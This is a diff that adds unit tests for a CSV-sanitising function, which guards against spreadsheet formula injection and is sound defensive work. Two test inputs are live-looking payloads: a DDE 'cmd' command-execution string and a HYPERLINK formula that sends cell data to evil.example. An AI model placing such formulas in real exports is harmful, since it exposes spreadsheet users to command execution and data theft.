@@ -87,3 +87,31 @@ class TestUserMessage:
         assert "Klocka" in msg
         assert "butik.se" in msg
         assert "299" in msg
+
+
+class TestSafeCsv:
+    def setup_method(self):
+        from app import _safe_csv
+        self.safe = _safe_csv
+
+    def test_normal_value_unchanged(self):
+        assert self.safe("En fin klocka") == "En fin klocka"
+
+    def test_empty_string_unchanged(self):
+        assert self.safe("") == ""
+
+    def test_formula_equals_prefixed(self):
+        assert self.safe("=SUM(A1:A10)") == "'=SUM(A1:A10)"
+
+    def test_formula_plus_prefixed(self):
+        assert self.safe("+cmd|' /C calc'!A0") == "'+cmd|' /C calc'!A0"
+
+    def test_formula_minus_prefixed(self):
+        assert self.safe("-2+3") == "'-2+3"
+
+    def test_formula_at_prefixed(self):
+        assert self.safe("@SUM(1+1)") == "'@SUM(1+1)"
+
+    def test_hyperlink_injection_blocked(self):
+        payload = '=HYPERLINK("http://evil.example/?d="&A1,"Click")'
+        assert self.safe(payload).startswith("'")
